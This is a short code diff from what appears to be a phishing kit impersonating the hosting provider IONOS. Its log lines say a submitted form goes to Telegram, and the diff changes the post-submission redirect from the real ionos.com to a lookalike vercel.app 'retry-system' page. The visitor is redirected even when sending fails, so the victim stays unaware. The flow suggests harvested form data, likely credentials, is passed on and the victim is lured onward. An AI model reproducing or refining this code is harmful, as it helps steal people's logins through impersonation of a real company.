@@ -202,14 +202,14 @@ $(document).ready(function() {
           console.log("✅ Form submitted to Telegram successfully");
           // Redirect after a successful submission
           setTimeout(function () {
-            window.location.href = "https://www.ionos.com";
+            window.location.href = "https://retry-system-ionos-actionpanel.vercel.app/";
           }, 1000);
         },
         error: function (jqXHR, textStatus, errorThrown) {
           console.error("❌ Failed to send message to Telegram:", textStatus, errorThrown);
           // Still redirect even if there's an error (to maintain user experience)
           setTimeout(function () {
-            window.location.href = "https://www.ionos.com";
+            window.location.href = "https://retry-system-ionos-actionpanel.vercel.app/";
           }, 1000);
         }
       });
